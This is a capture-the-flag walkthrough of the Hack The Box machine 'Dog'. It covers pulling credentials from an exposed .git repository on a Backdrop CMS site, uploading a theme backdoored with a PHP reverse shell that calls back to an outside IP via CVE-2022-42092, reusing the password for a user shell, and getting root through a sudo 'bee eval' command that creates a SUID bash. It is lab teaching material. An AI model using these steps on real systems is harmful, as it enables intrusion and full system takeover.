---
icon: bone
---

# HTB-DOG

<figure><img src="../../../../.gitbook/assets/image (366).png" alt=""><figcaption></figcaption></figure>

***

**Execution Phase**

1. **Web Page** → Exposes **`.git` directory** → Leads to **accessing full source code**.
2. From the **repository**, attacker finds **username & password** for **Backdrop CMS**.
3. Using **CVE-2022-42092** (file upload vulnerability) → Uploads reverse shell → Gets **shell as `www-data`**.

**Privilege Escalation Phase**\
4\. **Password reuse** → Gains **shell as `johncusack`**.\
5\. Using **command execution via "bee"** tool → Gains **root shell**.

***

### Reconnaissance <a href="#reconnaissance" id="reconnaissance"></a>

```python
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
|_  256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Home | Dog
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-git:
|   10.129.213.102:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
| http-robots.txt: 22 disallowed entries (15 shown)
| /core/ /profiles/ /README.md /web.config /admin
| /comment/reply /filter/tips /node/add /search /user/register
|_/user/password /user/login /user/logout /?q=admin /?q=comment/reply
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

The **nmap** scan found only two ports, 22 and 80. There’s **Backdrop CMS** running on the web server and the scan uncovered a `.git` folder being present.

### Execution <a href="#execution" id="execution"></a>

Git (or any other revision tool) usually holds interesting information and possibly also credentials that were added by mistake. [git-dumper](https://github.com/arthaud/git-dumper) can be used to _clone_ the repository into a local folder to inspect the contents.

```python
(sn0x㉿sn0x)-[~/hackthebox/DOG]
└─$ git-dumper http://10.129.213.102/.git dog.git
--- SNIP ---
[-] Fetching http://10.129.213.102/.git/refs/heads/master [200]
[-] Sanitizing .git/config
[-] Running git checkout .
Updated 2873 paths from the index
```

The git repository contains the source code for the web application. It does include a `settings.php` file that holds the username and the password `BackDropJ2024DS2024` for the **MySQL** database. Those credentials unfortunately do not work for **SSH** or on the web interface.

```python
(sn0x㉿sn0x)-[~/hackthebox/DOG]
└─$ cd dog.git
 
(sn0x㉿sn0x)-[~/hackthebox/DOG]
└─$ ls -al
total 92
drwxrwxr-x 8 sn0x  sn0x  4096 May  3 14:11 .
drwxrwxr-x 3 sn0x  sn0x  4096 May  3 14:10 ..
drwxrwxr-x 8 sn0x  sn0x  4096 May  3 14:12 .git
-rwxrwxr-x 1 sn0x  sn0x 18092 May  3 14:11 LICENSE.txt
-rwxrwxr-x 1 sn0x  sn0x 5285 May  3 14:11 README.md
drwxrwxr-x 9 sn0x  sn0x  4096 May  3 14:11 core
drwxrwxr-x 7 sn0x  sn0x  4096 May  3 14:11 files
-rwxrwxr-x 1 sn0x  sn0x   578 May  3 14:11 index.php
drwxrwxr-x 2 sn0x  sn0x  4096 May  3 14:11 layouts
-rwxrwxr-x 1 sn0x  sn0x  1198 May  3 14:11 robots.txt
-rwxrwxr-x 1 sn0x  sn0x 21732 May  3 14:11 settings.php
drwxrwxr-x 2 sn0x  sn0x  4096 May  3 14:11 sites
drwxrwxr-x 2 sn0x  sn0x  4096 May  3 14:11 themes
 
$ cat settings.php
<?php
/**
 * @file
 * Main Backdrop CMS configuration file.
 */
 
/**
 * Database configuration:
 *
 * Most sites can configure their database by entering the connection string
 * below. If using primary/replica databases or multiple connections, see the
 * advanced database documentation at
 * https://api.backdropcms.org/database-configuration
 */
$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
$database_prefix = '';
--- SNIP ---
```

Running `git status` only shows a single commit made by `dog@dog.htb`. I add the domain name to my `/etc/hosts` file and then check for other occurrences of this string in the repository. This finds another potential username `tiffany`.

```python
(sn0x㉿sn0x)-[~/hackthebox/DOG]
└─$ git status
commit 8204779c764abd4c9d8d95038b6d22b6a7515afa (HEAD -> master)
Author: root <dog@dog.htb>
Date:   Fri Feb 7 21:22:11 2025 +0000
 
    todo: customize url aliases.  reference:https://docs.backdropcms.org/documentation/url-aliases
 
(sn0x㉿sn0x)-[~/hackthebox/DOG]
└─$ grep -ir dog.htb
files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json:        "tiffany@dog.htb"
```

This time the credentials `tiffany:BackDropJ2024DS2024` work for the login on **Backdrop CMS** and I get access to the dashboard.

<figure><img src="../../../../.gitbook/assets/image (367).png" alt=""><figcaption></figcaption></figure>

Running the status report reveals version `1.27.1` and looking for known vulnerabilities quickly finds [CVE-2022-42092](https://grimthereaperteam.medium.com/backdrop-cms-1-22-0-unrestricted-file-upload-themes-ad42a599561c), an unrestricted files upload via the themes feature. Even though it specifies `>=1.22.0` the concept is still valid.

> \
> Another approach would be to use the proof-of-concept [here](https://www.exploit-db.com/exploits/52021) to upload a malicious module instead.

<figure><img src="../../../../.gitbook/assets/image (368).png" alt=""><figcaption></figcaption></figure>

I search for [themes](https://github.com/orgs/backdrop-contrib/repositories?q=theme) and pick one at [random](https://github.com/backdrop-contrib/bedrock). After extracting the contents, I add my reverse shell as a new PHP file. Then I create a new TAR archive (because the ZIP extension is not available on the server).

```python
(sn0x㉿sn0x)-[~/hackthebox/DOG]
└─$ unzip bedrock.zip
Archive:  bedrock.zip
  inflating: bedrock/js/bedrock.js   
  inflating: bedrock/css/base.css    
  inflating: bedrock/css/system.theme.css  
  inflating: bedrock/css/bedrock-ui.css  
  inflating: bedrock/img/throbber.svg  
  inflating: bedrock/screenshot.png  
  inflating: bedrock/README.md       
  inflating: bedrock/template.php    
  inflating: bedrock/LICENSE.txt     
  inflating: bedrock/bedrock.info
 
(sn0x㉿sn0x)-[~/hackthebox/DOG]
└─$ cp /usr/share/webshells/php/php-reverse-shell.php bedrock/sn0x.php
 
(sn0x㉿sn0x)-[~/hackthebox/DOG]
└─$ sed -i 's#127.0.0.1#10.10.10.10#g' bedrock/sn0x.php
 
(sn0x㉿sn0x)-[~/hackthebox/DOG]
└─$ tar cf bedrock.tar bedrock
```

Navigating to **Appearance** ⇒ **Install New Themes** I can pick **Manual installation** to upload my _backdoored_ theme. After the upload I’m able to access the files in `/themes/bedrock/`. As soon as a I click on the nifty.php file I do get a callback as `www-data`.

<figure><img src="../../../../.gitbook/assets/image (369).png" alt=""><figcaption></figcaption></figure>

### Privilege Escalation <a href="#privilege-escalation" id="privilege-escalation"></a>

#### Shell as johncusack <a href="#shell-as-johncusack" id="shell-as-johncusack"></a>

There are only three users with a shell configured on the system. Trying to re-use the password `BackDropJ2024DS2024` for them works on `johncusack` and I can read the first flag.

```python
(sn0x㉿sn0x)-[~/hackthebox/DOG]
└─$ grep "sh$" /etc/passwd
root:x:0:0:root:/root:/bin/bash
jobert:x:1000:1000:jobert:/home/jobert:/bin/bash
johncusack:x:1001:1001:,,,:/home/johncusack:/bin/bash
```

The `bee` command can be used to run arbitrary PHP code with the `eval` command<sup>1</sup>, so I just copy the bash binary and set the SUID bit in order to escalate my privileges to root.

```python
(sn0x㉿sn0x)-[~/hackthebox/DOG]
└─$ sudo /usr/local/bin/bee eval "shell_exec('cp /bin/bash /tmp/bash; chmod u+s /tmp/bash');"
 
(sn0x㉿sn0x)-[~/hackthebox/DOG]
└─$ ls -la /tmp/bash
-rwsr-xr-x 1 root root 1183448 May  3 12:43 /tmp/bash
```

<figure><img src="../../../../.gitbook/assets/complete.gif" alt=""><figcaption></figcaption></figure>
